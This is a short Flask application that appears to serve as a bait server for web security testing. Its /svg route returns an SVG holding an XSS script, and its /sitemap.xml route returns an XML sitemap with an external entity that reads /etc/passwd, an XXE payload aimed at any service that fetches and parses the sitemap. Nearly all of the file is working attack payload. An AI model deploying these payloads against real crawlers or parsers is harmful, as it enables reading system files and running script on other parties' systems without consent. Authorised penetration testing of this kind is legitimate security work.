from flask import Flask, Response
import textwrap

app = Flask(__name__)

@app.route('/')
def home():
    return 'Hello, World!'

@app.route('/svg')
def about():
    svg = """<?xml version="1.0" encoding="UTF-8"?>
    <svg xmlns="http://www.w3.org/2000/svg">
        <script>alert(document.domain)</script>
    </svg>"""
    return Response(svg, mimetype="image/svg+xml")

@app.route("/sitemap.xml")
def sitemap():
    xml_bytes = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<!DOCTYPE urlset ['
        b'    <!ENTITY xxe SYSTEM "file:///etc/passwd">'
        b']>'
        b'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'
        b'<url>'
        b'<loc>https://w41test.vercel.app/?=&xxe;</loc>'
        b'<lastmod>2025-07-30</lastmod>'
        b'<changefreq>daily</changefreq>'
        b'<priority>1.0</priority>'
        b'</url>'
        b'</urlset>'
    )

    return Response(xml_bytes, content_type="application/xml; charset=utf-8")